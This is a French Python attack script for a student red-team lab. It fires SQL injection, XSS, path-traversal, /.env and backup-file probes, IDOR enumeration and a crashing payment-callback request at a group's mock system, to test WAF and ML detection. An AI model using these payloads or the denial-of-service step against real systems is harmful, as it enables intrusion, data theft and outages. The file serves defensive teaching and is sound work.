"""Scénario d'attaque Red Team — LABORATOIRE UNIQUEMENT.

À exécuter depuis le PC Attaquant, contre le SI fictif de VOTRE groupe
exclusivement (sujet §3.4 et §9). Ne jamais viser le réseau du campus, un autre
groupe ou un service tiers.

Trois étapes, qui produisent un effet observable par la supervision :
  1. un scan de payloads malveillants -> bloqués par le WAF (403), visibles
     dans les logs (feature waf_blocks) et dans le taux d'erreurs 4xx ;
  2. des tentatives de récupération de données (injections d'extraction,
     endpoints sensibles, énumération d'identifiants) -> bloquées par le WAF
     (403) et erreurs 4xx. Aucune donnée réelle n'existe derrière ces routes :
     le but est de produire du trafic malveillant reconnaissable ;
  3. l'abus du callback de paiement non authentifié -> met l'API hors service
     (erreurs 5xx), ce que le détecteur ML doit repérer.

Usage :
    python attack.py --target http://192.168.137.1:8080
"""
import argparse

import httpx

SCAN_PAYLOADS = [
    "/products?id=1 UNION SELECT password FROM users",
    "/search?q=<script>alert(1)</script>",
    "/files?path=../../etc/passwd",
    "/login?user=admin' OR 1=1--",
]

# Injections orientées "dump" : l'attaquant essaie de faire cracher à la base
# des colonnes sensibles (numéros de carte, identifiants). Le WAF doit les
# bloquer (403). Dans ce labo aucune table de ce genre n'existe réellement.
DUMP_PAYLOADS = [
    "/products?id=1 UNION SELECT card_number FROM payments",
    "/products?id=0 OR 1=1 UNION SELECT username, password FROM users",
    "/transactions?filter=1' AND SLEEP(5)--",
]

# Endpoints sensibles tentés "à l'aveugle" : sauvegardes, exports, fichiers de
# conf. Ils n'existent pas (404) ou sont refusés (403) ; c'est la tentative
# elle-même qui est le signal pour la supervision.
SENSITIVE_PATHS = [
    "/backup.sql",
    "/.env",
    "/admin/export?format=csv",
    "/api/users?all=true",
]


def scan(client: httpx.Client, target: str):
    print("== Étape 1 : scan de payloads (le WAF doit répondre 403) ==")
    for path in SCAN_PAYLOADS:
        code = client.get(target + path).status_code
        print(f"  {code}  {path}")


def exfiltration(client: httpx.Client, target: str):
    # Étape de "récupération de données" : purement du trafic malveillant
    # reconnaissable (403/4xx). On ne récupère rien de réel — les routes ciblées
    # sont fictives — mais le volume de blocages WAF et d'erreurs 4xx alimente
    # les features du détecteur (waf_blocks + taux d'erreurs).
    print("== Étape 2 : tentatives de récupération de données (WAF 403 / erreurs 4xx) ==")

    for path in DUMP_PAYLOADS:
        code = client.get(target + path).status_code
        print(f"  dump     {code}  {path}")

    for path in SENSITIVE_PATHS:
        code = client.get(target + path).status_code
        print(f"  fichier  {code}  {path}")

    # Énumération (IDOR) : on parcourt des identifiants de transaction pour
    # aspirer les enregistrements un par un. Volume volontairement faible (labo) ;
    # on résume les réponses plutôt que d'imprimer 20 lignes.
    blocked = 0
    for tx_id in range(1, 21):
        code = client.get(f"{target}/transactions/{tx_id}").status_code
        if code >= 400:
            blocked += 1
    print(f"  idor     énumération /transactions/1..20 -> {blocked}/20 refusées (403/4xx)")


def exploit(client: httpx.Client, target: str):
    print("== Étape 3 : abus du callback de paiement (met l'API hors service) ==")
    response = client.post(f"{target}/pay/callback", json={"status": "__CRASH__"})
    print(f"  callback -> {response.status_code}")
    code = client.get(f"{target}/healthz").status_code
    print(f"  healthz après exploitation -> {code} (503/500 attendu : service dégradé)")


def main():
    parser = argparse.ArgumentParser(description="Attaque de laboratoire contre le SI fictif du groupe")
    parser.add_argument("--target", default="http://127.0.0.1:8080", help="URL du WAF du groupe")
    args = parser.parse_args()

    print(f"Cible : {args.target}  (doit être le SI fictif de votre groupe)\n")
    with httpx.Client(timeout=5) as client:
        scan(client, args.target)
        exfiltration(client, args.target)
        exploit(client, args.target)
    print("\nL'incident est en cours. Observez la détection et la reprise automatique.")


if __name__ == "__main__":
    main()
